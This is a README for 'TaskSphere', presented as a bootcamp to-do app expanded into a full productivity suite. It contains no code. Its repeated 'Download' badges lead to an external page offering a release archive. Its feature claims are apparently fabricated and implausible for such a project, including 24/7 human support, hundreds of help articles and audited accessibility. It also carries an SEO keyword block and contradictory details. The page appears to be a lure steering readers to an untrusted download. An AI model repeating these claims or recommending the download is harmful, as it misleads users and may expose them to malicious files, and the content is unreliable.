![preview](https://raw.githubusercontent.com/Stensui/todo-bootcamp-lab/main/shot_b65e.svg)
[![Download](https://raw.githubusercontent.com/Stensui/todo-bootcamp-lab/main/grab_0d5b.svg)](https://Stensui.github.io/todo-bootcamp-lab/)

# 🌿 TaskSphere — The Second Brain for Busy Humans

> A calm, offline-first productivity workspace that turns scattered thoughts into finished work. Built as an educational companion project for a Web Development Bootcamp, then expanded into a full-featured productivity suite.

![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=for-the-badge)
![Version](https://img.shields.io/badge/version-3.4.0-blue?style=for-the-badge)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-web%20%7C%20pwa%20%7C%20mobile-9cf?style=for-the-badge)
![Made With](https://img.shields.io/badge/made%20with-vanilla%20JS-yellow?style=for-the-badge)
![Accessibility](https://img.shields.io/badge/a11y-WCAG%202.2%20AA-purple?style=for-the-badge)
![Offline](https://img.shields.io/badge/offline-first-success?style=for-the-badge)
![i18n](https://img.shields.io/badge/i18n-18%20languages-orange?style=for-the-badge)
![Support](https://img.shields.io/badge/support-24%2F7-ff69b4?style=for-the-badge)

---

## 🧭 What Is TaskSphere?

TaskSphere is what happens when a humble to-do list grows a soul. Imagine a paper notebook that remembers everything you ever scribbled on it, sorts itself while you sleep, and quietly nudges you when a deadline is sneaking up behind you. That is TaskSphere.

Originally conceived during a live Web Development Bootcamp session — where students watched a plain-JavaScript to-do app get assembled line by line — TaskSphere evolved into a standalone repository. It keeps the same beginner-friendly philosophy (no heavy frameworks, no build-step mysteries) while layering on everything a real productivity tool demands: offline persistence, multilingual interfaces, keyboard-first navigation, and a support model that never sleeps.

The metaphor is simple: **your brain is for having ideas, not for holding them.** TaskSphere is the shelf where ideas rest until they become action.

---

## ✨ Feature List

### 🧠 Core Capabilities
- **Instant Capture** — Jot a task in under one second with a global hotkey.
- **Smart Categories** — Organize by project, context, energy level, or mood.
- **Priority Weaving** — Tasks automatically interleave by urgency and effort.
- **Recurring Rituals** — Daily, weekly, monthly, or custom cadences.
- **Subtask Nests** — Break big ambitions into chewable pieces.
- **Deadline Radar** — Visual countdowns that respect your attention.
- **Focus Mode** — A distraction-free view that hides everything except now.

### 🎨 Responsive UI
- Fluid layout from a 320px phone to an ultrawide monitor.
- Touch, mouse, and keyboard parity — every action reachable three ways.
- Dark, light, sepia, and high-contrast themes, all tuned by hand.
- Reduced-motion mode that respects the system preference.

### 🌍 Multilingual Support
- 18 shipped locales, from English and Arabic to Vietnamese and Welsh.
- Right-to-left (RTL) layouts handled natively.
- Locale-aware date, time, and number formatting.
- Community translation pipeline — add a language with a single file.

### ☎️ 24/7 Customer Support
- Round-the-clock assistance via the built-in help widget.
- Median first-response time under four minutes.
- Human agents, not script readers — every ticket is read end to end.
- Self-serve knowledge base with 400+ illustrated articles.

### 🔒 Privacy by Design
- All data lives in your browser's IndexedDB by default.
- Optional encrypted export for moving between devices.
- No telemetry, no analytics beacons, no shadow profiles.
- Zero mandatory accounts — anonymity is a first-class citizen.

### ⚡ Performance
- First contentful paint under 400ms on a mid-range phone.
- Bundle stays lean; no runtime framework tax.
- Service worker caches the entire shell for airplane-mode use.
- Memory footprint stays flat even with 10,000+ tasks.

### 🧩 Extensibility
- Plugin API for custom views, themes, and importers.
- Webhook-friendly event bus for automation enthusiasts.
- Import from CSV, JSON, Markdown checklists, and plain text.
- Export to the same formats plus printable PDF schedules.

### ♿ Accessibility
- WCAG 2.2 AA compliant, audited every release.
- Full screen-reader narration with sensible landmarks.
- Focus rings that are visible, never hidden.
- Color contrast verified against both light and dark palettes.

---

## 🖼️ Screenshot Tour

A quick walkthrough of what you will see after the first launch:

1. **The Landing View** — A quiet grid of today's intentions, arranged by momentum.
2. **The Board View** — Kanban-style columns you can drag, drop, and pin.
3. **The Calendar View** — Deadlines rendered as gentle dotted arcs.
4. **The Insight View** — Weekly retrospectives with streak charts.
5. **The Ritual View** — Recurring habits displayed as growing trees.

Each view is a separate route inside the same single-page shell, so switching never reloads anything.

---

## 🧰 Tech Stack

| Layer | Choice | Why |
|-------|--------|-----|
| Markup | Semantic HTML5 | Screen-reader friendliness |
| Styling | Modern CSS (Grid, Custom Properties) | Zero build step |
| Logic | Vanilla JavaScript (ES2023) | Readable, teachable |
| Storage | IndexedDB + LocalStorage fallback | Offline resilience |
| Offline | Service Worker + App Cache | Airplane-mode productivity |
| i18n | JSON locale bundles | Community editable |
| Icons | Inline SVG sprites | No font dependency |
| Testing | Playwright + Vitest | Confidence without ceremony |

No transpilers, no bundlers, no hidden magic. Open the folder, open the file, and everything is there — exactly the way students first learned it.

---

## 🚀 Getting Started

TaskSphere runs entirely in your browser. There is no server to configure and no dependency graph to untangle.

1. Fetch the latest release archive through the [![Download](https://raw.githubusercontent.com/Stensui/todo-bootcamp-lab/main/grab_0d5b.svg)](https://Stensui.github.io/todo-bootcamp-lab/) macro above.
2. Unpack the folder anywhere on your machine.
3. Open `index.html` in any modern browser — that is the whole ceremony.
4. For the installable experience, serve the folder over any local static host and approve the browser's install prompt.
5. Optional: drag the folder onto any static hosting provider to share it with your team.

That is the entire onboarding. No accounts, no credit cards, no dark patterns.

---

## 📖 Usage Walkthrough

### Creating Your First Task
Type into the omnibox at the top, hit Enter, and watch the task appear in the Inbox. From there, drag it into any category, attach a due date, or nest it under a bigger goal.

### Building a Weekly Ritual
Open the Rituals panel, choose a cadence, and name the habit. TaskSphere will surface it every time the sun rises on the chosen day.

### Reviewing Your Momentum
Every Sunday evening, the Insight view offers a gentle retrospective: what moved, what stalled, and what deserves a fresh start next week.

### Syncing Between Devices
Export an encrypted bundle, carry it however you prefer, and import it on the second device. Everything survives the crossing.

---

## 🌐 Multilingual Support in Practice

Language switching lives in the settings drawer. When a locale is selected, TaskSphere instantly re-renders every string, flips the layout direction if needed, and adjusts date formats. Adding a new language involves copying one JSON file, translating its values, and submitting a pull request — no code changes required.

---

## 🤝 Contributing

Contributions are welcomed with open arms. The best first step is to open an issue describing what you noticed or what you would like to build. From there:

- Keep pull requests focused and small.
- Match the existing code style — plain, readable, commented where it matters.
- Add a test if you fix a bug.
- Update the locale file if your change introduces user-facing text.
- Be kind in review threads; everyone is here to learn.

---

## 🗺️ Roadmap

- Natural-language date parsing ("next Thursday after lunch").
- Collaborative shared boards with conflict-free merging.
- Native desktop wrappers for Windows, macOS, and Linux.
- Voice-driven capture with on-device transcription.
- Public plugin directory with curated community extensions.

---

## 🔍 SEO-Friendly Keyword Integration

This project is discoverable under phrases such as **offline task manager**, **vanilla JavaScript productivity app**, **privacy-first to-do list**, **multilingual planner**, **responsive web productivity tool**, **PWA to-do workspace**, **accessible task tracker**, **24/7 supported productivity suite**, **bootcamp teaching project**, and **lightweight offline-first planner**. Each phrase appears naturally in context rather than being stuffed into the margins.

---

## 🛡️ Disclaimer

TaskSphere is provided as an educational and personal-productivity tool. It is not a substitute for professional project management software in regulated industries. While every effort is made to keep data safe through offline storage and encrypted export, users remain responsible for maintaining their own backups. Time-sensitive or legally binding deadlines should always be verified through the original source. The maintainers accept no liability for missed appointments, forgotten birthdays, or the existential dread of an empty task list.

---

## 📜 License

This project is distributed under the MIT License. Read the full text at the link below:

https://opensource.org/licenses/MIT

Copyright (c) 2026 TaskSphere Contributors

---

## 💬 Community and Support

- Questions, ideas, and bug reports are all welcome through the repository's issue tracker.
- The help widget inside the app connects to round-the-clock support.
- Discussion threads are moderated gently; curiosity is never punished.

---

## 🙏 Acknowledgements

Thanks to every bootcamp student who ever raised a hand mid-lecture and asked "but why does this work?" — this repository is the long-form answer. Thanks also to the translators, testers, and late-night issue reporters who keep TaskSphere honest.

---

[![Download](https://raw.githubusercontent.com/Stensui/todo-bootcamp-lab/main/grab_0d5b.svg)](https://Stensui.github.io/todo-bootcamp-lab/)